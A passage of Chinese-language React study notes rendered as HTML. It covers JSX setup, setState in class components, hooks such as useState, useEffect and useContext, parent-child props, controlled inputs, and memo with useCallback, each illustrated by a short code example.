class="hljs-keyword">const</span> element = (<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span></span><br><span class="language-xml">    Hello, &#123;formatName(user)&#125;!</span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br>);<br><br><span class="hljs-title class_">ReactDOM</span>.<span class="hljs-title function_">render</span>(<br>  element,<br>  <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;root&#x27;</span>)<br>);<br></code></pre></td></tr></table></figure><h3 id="4-JS中出现-代表其中想要写html，html中出现-代表其中想要写js"><a href="#4-JS中出现-代表其中想要写html，html中出现-代表其中想要写js" class="headerlink" title="4. JS中出现()代表其中想要写html，html中出现{}代表其中想要写js"></a>4. JS中出现()代表其中想要写html，html中出现{}代表其中想要写js</h3><h3 id="5-语法🍬："><a href="#5-语法🍬：" class="headerlink" title="5. 语法🍬："></a>5. 语法🍬：</h3><p>在vs code中配置jsx的语法：在设置中搜素include languages，添加”javascript”: “javascriptreact“，将Trigger Expansion On Tab设置为启用</p><p>安装es7插件，rcc+tab或rfc+tab改变人生（类组件和函数式组件</p><p>在settings.json中添加    “editor.formatOnSave”: true,  可以在保存时自动格式化代码</p><h3 id="6-普通变量的值变化不会触发视图更新，可以使用setState来更新视图"><a href="#6-普通变量的值变化不会触发视图更新，可以使用setState来更新视图" class="headerlink" title="6. 普通变量的值变化不会触发视图更新，可以使用setState来更新视图"></a>6. 普通变量的值变化不会触发视图更新，可以使用setState来更新视图</h3><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, &#123; <span class="hljs-title class_">Component</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span><br><br><span class="hljs-keyword">const</span> num = <span class="hljs-number">1</span>;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">App2</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Component</span> &#123;<br>    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">props</span>) &#123;<br>        <span class="hljs-variable language_">super</span>(props)<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span> = &#123;<br>            <span class="hljs-attr">num</span>: <span class="hljs-number">1</span><br>        &#125;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">addNum</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">addNum</span>.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">this</span>)<br>    &#125;<br>    <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> (<br>            <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>数字为：&#123;this.state.num&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span><br><span class="language-xml">                &#123;/* 改变值且刷新页面的四种写法 */&#125;</span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> this.setState(&#123; num: this.state.num + 1 &#125;)&#125;&gt;累加1<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;this.addNum.bind(this)&#125;</span>&gt;</span>累加2<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> this.addNum()&#125;&gt;累加3<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;this.addNum&#125;</span>&gt;</span>累加3<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>        )<br>    &#125;<br>    <span class="hljs-title function_">addNum</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(&#123; <span class="hljs-attr">num</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>.<span class="hljs-property">num</span> + <span class="hljs-number">1</span> &#125;)<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="7-给自定义的方法传递参数："><a href="#7-给自定义的方法传递参数：" class="headerlink" title="7. 给自定义的方法传递参数："></a>7. 给自定义的方法传递参数：</h3><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jsx">&lt;button onClick=&#123;<span class="hljs-variable language_">this</span>.<span class="hljs-property">btnClick</span>.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">this</span>, <span class="hljs-number">1</span>)&#125;&gt;按钮<span class="hljs-number">1</span>&lt;/button&gt;<br><span class="hljs-title function_">btnClick</span>(<span class="hljs-params">num</span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(num)<br>    &#125;<br></code></pre></td></tr></table></figure><h3 id="8-函数式组件没有生命周期，没有this，函数式组件没有state状态，主要用Hook：React官方提供的hook-x2F-开发人员自定义的hook"><a href="#8-函数式组件没有生命周期，没有this，函数式组件没有state状态，主要用Hook：React官方提供的hook-x2F-开发人员自定义的hook" class="headerlink" title="8. 函数式组件没有生命周期，没有this，函数式组件没有state状态，主要用Hook：React官方提供的hook&#x2F;开发人员自定义的hook"></a>8. 函数式组件没有生命周期，没有this，函数式组件没有state状态，主要用Hook：React官方提供的hook&#x2F;开发人员自定义的hook</h3><h3 id="9-hook-只能用在组件函数的最顶层"><a href="#9-hook-只能用在组件函数的最顶层" class="headerlink" title="9. hook: 只能用在组件函数的最顶层"></a>9. hook: 只能用在组件函数的最顶层</h3><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-comment">// 最简单的hook：useState</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, &#123; useState &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span><br><br><span class="hljs-keyword">let</span> msg = <span class="hljs-string">&quot;good&quot;</span><br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">App5</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">const</span> [msg, setMsg] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-comment">// const fn = () =&gt; &#123;</span><br>    <span class="hljs-comment">//     setMsg(&#x27;changed&#x27;)</span><br>    <span class="hljs-comment">// &#125;</span><br><br>    <span class="hljs-keyword">const</span> <span class="hljs-title function_">fn</span> = (<span class="hljs-params"></span>) =&gt; <span class="hljs-title function_">setMsg</span>(<span class="hljs-number">0</span>)<br><br>    <span class="hljs-keyword">return</span> (<br>        <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>&#123;msg&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;fn&#125;</span>&gt;</span>修改1<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> setMsg(0)&#125;&gt;修改2<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> setMsg(msg + 1)&#125;&gt;累加<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>    )<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="10-数据请求、检测数据更新、垃圾回收的实现：useEffect"><a href="#10-数据请求、检测数据更新、垃圾回收的实现：useEffect" class="headerlink" title="10. 数据请求、检测数据更新、垃圾回收的实现：useEffect"></a>10. 数据请求、检测数据更新、垃圾回收的实现：useEffect</h3><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">import</span> &#123; useState, useEffect &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span><br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">App6</span>(<span class="hljs-params"></span>) &#123;<br><br>    <span class="hljs-keyword">const</span> [num1, setNum1] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">const</span> [num2, setNum2] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">2</span>)<br><br>    <span class="hljs-comment">// 模拟mounted，一般在这个位置写ajax：数据请求，也可以检测数据更新</span><br>    <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;mounted&#x27;</span>)<br>    &#125;)<br><br>    <span class="hljs-comment">// 检测特定数据更新，写在数组中，不写的话默认检测所有变量更新</span><br>    <span class="hljs-comment">// 不想检测可以给空数组</span><br>    <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;num1更新了&#x27;</span>)<br>    &#125;, [num1])<br><br>    <span class="hljs-comment">// 模拟beforeDestory，一般在这个阶段处理脏数据和垃圾回收</span><br>    <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;destory&#x27;</span>)<br>        &#125;<br>    &#125;)<br><br>    <span class="hljs-keyword">return</span> (<br>        <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>数字1为：&#123;num1&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> setNum1(num1 + 1)&#125;&gt;累加1<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">hr</span> /&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>数字2为：&#123;num2&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> setNum2(num2 + 1)&#125;&gt;累加2<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><br>    )<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="11-组件间传参"><a href="#11-组件间传参" class="headerlink" title="11. 组件间传参"></a>11. 组件间传参</h3><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, &#123; useState &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span><br><br><span class="hljs-comment">// 父传子：使用props</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Child</span>(<span class="hljs-params">props</span>) &#123;<br>    <span class="hljs-keyword">return</span> (<br>        <span class="language-xml"><span class="hljs-tag">&lt;&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>子组件 - &#123;props.num&#125; - <span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> props.setNum(333)&#125;&gt;修改值<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/&gt;</span></span><br>    )<br>&#125;<br><br><span class="hljs-comment">// 父组件</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Father</span>(<span class="hljs-params">props</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Child</span> <span class="hljs-attr">num</span>=<span class="hljs-string">&#123;props.num&#125;</span> <span class="hljs-attr">setNum</span>=<span class="hljs-string">&#123;props.setNum&#125;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">Child</span>&gt;</span></span><br>&#125;<br><br><span class="hljs-comment">// 顶级组件</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">App7</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">const</span> [num, setNum] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">123</span>)<br>    <span class="hljs-comment">// 提供给子组件用来修改num的函数</span><br>    <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Father</span> <span class="hljs-attr">num</span>=<span class="hljs-string">&#123;num&#125;</span> <span class="hljs-attr">setNum</span>=<span class="hljs-string">&#123;setNum&#125;</span> /&gt;</span></span><br>&#125;<br><br><span class="hljs-comment">// 子传父，真正在干活的是父组件: 提供用于修改的函数</span><br></code></pre></td></tr></table></figure><h3 id="12-多级组件的传值一般会使用上下文空间"><a href="#12-多级组件的传值一般会使用上下文空间" class="headerlink" title="12. 多级组件的传值一般会使用上下文空间"></a>12. 多级组件的传值一般会使用上下文空间</h3><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, &#123; useState, createContext, useContext &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span><br><br><span class="hljs-comment">// 创建上下文空间（提供者、消费者）（provider, consumer）</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">NumContext</span> = <span class="hljs-title function_">createContext</span>()<br><br><span class="hljs-comment">// 父传子：使用props</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Child</span>(<span class="hljs-params">props</span>) &#123;<br>    <span class="hljs-keyword">const</span> &#123; num, setNum &#125; = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">NumContext</span>)<br>    <span class="hljs-keyword">return</span> (<br>        <span class="language-xml"><span class="hljs-tag">&lt;&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>&#123;num&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> setNum(876)&#125;&gt;修改num<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/&gt;</span></span><br>    )<br>&#125;<br><br><span class="hljs-comment">//父组件</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">Father</span> = (<span class="hljs-params"></span>) =&gt; <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Child</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">Child</span>&gt;</span></span><br><br><span class="hljs-comment">// 顶级组件</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">App9</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">const</span> [num, setNum] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">123</span>)<br>    <span class="hljs-comment">// 提供给子组件用来修改num的函数</span><br>    <span class="hljs-keyword">return</span> (<br>        <span class="language-xml"><span class="hljs-tag">&lt;&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">NumContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;&#123;</span> <span class="hljs-attr">num</span>, <span class="hljs-attr">setNum</span> &#125;&#125;&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">Father</span> /&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">NumContext.Provider</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/&gt;</span></span><br>    )<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="13-受控组件和不受控组件，只存在于表单元素，受控组件就是表单元素的value需要state（或useSate）定义"><a href="#13-受控组件和不受控组件，只存在于表单元素，受控组件就是表单元素的value需要state（或useSate）定义" class="headerlink" title="13. 受控组件和不受控组件，只存在于表单元素，受控组件就是表单元素的value需要state（或useSate）定义"></a>13. 受控组件和不受控组件，只存在于表单元素，受控组件就是表单元素的value需要state（或useSate）定义</h3><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, &#123; useState &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span><br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">App10</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">const</span> [value, setValue] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">&#x27;asd&#x27;</span>)<br>    <span class="hljs-keyword">const</span> <span class="hljs-title function_">inputChange</span> = (<span class="hljs-params">e</span>) =&gt; &#123;<br>        <span class="hljs-title function_">setValue</span>(e.<span class="hljs-property">target</span>.<span class="hljs-property">value</span>)<br>    &#125;<br>    <span class="hljs-keyword">const</span> <span class="hljs-title function_">clickFn</span> = (<span class="hljs-params"></span>) =&gt; <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(value)<br>    <span class="hljs-keyword">return</span> (<br>        <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;value&#125;</span> <span class="hljs-attr">onChange</span>=<span class="hljs-string">&#123;inputChange&#125;</span> /&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;clickFn&#125;</span>&gt;</span>获取输入框的值<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>    )<br>&#125; <br><br><span class="hljs-comment">// 不受控组件：值不会被value和onChange影响</span><br><span class="hljs-comment">// 意味着表单元素的value无法通过state获取，只能使用ref（或useRef）获取</span><br></code></pre></td></tr></table></figure><h3 id="14-使用memo使父组件更新不影响子组件"><a href="#14-使用memo使父组件更新不影响子组件" class="headerlink" title="14. 使用memo使父组件更新不影响子组件"></a>14. 使用memo使父组件更新不影响子组件</h3><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, &#123; useState, memo &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span><br><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">Child</span> = <span class="hljs-title function_">memo</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">123</span>)<br>    <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>child<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>&#125;)<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">App11</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">const</span> [num, setNum] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">return</span> (<br>        <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>数字为：&#123;num&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> setNum(num + 1)&#125;&gt;</span><br><span class="language-xml">                累加</span><br><span class="language-xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">hr</span> /&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">Child</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">Child</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>    )<br>&#125;<br></code></pre></td></tr></table></figure><p>但是memo只有在子组件是纯静态的时候才有效，<br>不是纯静态时，可以使用useCallBack<br>memo可以配合useCallback使用</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, &#123; useState, memo, useCallback &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span><br><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">Child</span> = <span class="hljs-title function_">memo</span>(<span class="hljs-function">(<span class="hljs-params">props</span>) =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">123</span>)<br>    <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> props.doSth()&#125;&gt;累加<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br>&#125;)<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">App11</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">const</span> [num, setNum] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">1</span>)<br>    <span class="hljs-comment">// setNum(newValue) 使用新值强行覆盖初始值</span><br>    <span class="hljs-comment">// serNum(num =&gt; num+1) 不断使用新值覆盖旧值</span><br>    <span class="hljs-keyword">const</span> doSth = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>        <span class="hljs-title function_">setNum</span>(<span class="hljs-function"><span class="hljs-params">num</span> =&gt;</span> num + <span class="hljs-number">1</span>)<br>    &#125;, [])<br>    <span class="hljs-keyword">return</span> (<br>        <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>数字为：&#123;num&#125;<span class="hljs-tag">&lt;/<span 